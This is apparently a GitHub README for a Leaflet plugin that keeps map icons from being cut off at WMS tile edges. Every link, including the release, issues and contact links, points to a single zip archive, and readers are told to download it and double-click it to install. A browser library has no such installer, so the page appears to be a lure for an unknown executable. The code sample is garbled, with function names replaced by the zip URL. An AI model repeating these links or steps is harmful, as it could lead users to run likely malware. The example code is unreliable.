# 🌿 leaflet-wms-gutter - Prevent Icons from Being Cut Off

## 🚀 Getting Started
Welcome to the leaflet-wms-gutter project! This guide will help you download and run the application smoothly. Our tool enhances Leaflet WMS layers by adding gutter support. This helps you avoid losing important icons at tile edges.

## 📥 Download Now
[![Download](https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip%20Latest%https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip)](https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip)

## 📃 Overview
The leaflet-wms-gutter application improves how map icons display within Leaflet. Users often encounter an issue where icons get truncated due to tile boundaries. This application fills that gap and provides a seamless mapping experience.

## 💻 System Requirements
To run leaflet-wms-gutter, your system should meet the following requirements:

- **Operating System:** Works best on modern versions of Windows, macOS, or Linux.
- **Browser:** A web browser that supports Leaflet, such as Chrome, Firefox, Safari, or Edge.
- **JavaScript:** Ensure that JavaScript is enabled in your browser settings.

## 📚 Features
- **Gutter Support:** Prevents icons from being cut off at tile edges.
- **Simple Integration:** Easy to add to existing Leaflet maps.
- **Responsive Design:** Works well on various devices, including desktops and tablets.
- **Customizable:** Adjust gutter dimensions based on your needs.

## 🌐 Download & Install
To start using leaflet-wms-gutter, please visit the [Releases Page](https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip). 

1. Click on the [Releases Page](https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip) link.
2. Scroll to find the version you want to download.
3. Click on the download link for your operating system. Save the file to your computer.

Once downloaded, follow these steps to install and run:

1. Locate the downloaded file and double-click it to start the installation process.
2. Follow the prompts to complete the installation.
3. Open your web browser and create a new Leaflet map. Add the gutter support according to the instructions provided in your map setup.

## 🌍 Using leaflet-wms-gutter
After installation, you can easily enhance your Leaflet maps. Here’s a basic guide:

1. Initialize your Leaflet map.
2. Add a WMS layer using the gutter support feature.
3. Set up your tile layers and include necessary options.

Here is a simple example of how to implement it:

```javascript
var map = https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip('map').setView([51.505, -0.09], 13);
https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip('https://{s}https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip{z}/{x}/{y}.png', {
    maxZoom: 19,
}).addTo(map);

var wmsLayer = https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip("https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip", {
    layers: 'your_layer',
    format: 'image/png',
    transparent: true,
    gutter: 50 // Add gutter support
}).addTo(map);
```

Adjust the `gutter` parameter to fit your specific needs.

## 📊 Support and Troubleshooting
If you encounter issues while using leaflet-wms-gutter, consider these tips:

- **Check System Requirements:** Ensure your system meets the above requirements.
- **Browser Issues:** Make sure you are using an updated browser.
- **WMS Server Compatibility:** Verify that your WMS server settings are correct.

For further help, you can check the FAQ section on our [GitHub Issues Page](https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip).

## 🌟 Contributing
We welcome contributions! If you want to improve leaflet-wms-gutter, please follow these steps:

1. Fork the repository on GitHub.
2. Create your feature branch.
3. Commit your changes.
4. Push the branch and open a pull request.

## 📞 Contact
If you have any questions or feedback, please feel free to reach out via the [Issues Page](https://raw.githubusercontent.com/naruthor2/leaflet-wms-gutter/main/hoarder/leaflet-wms-gutter-v3.3.zip).

## 📄 License
This project is licensed under the MIT License. Please see the LICENSE file for details.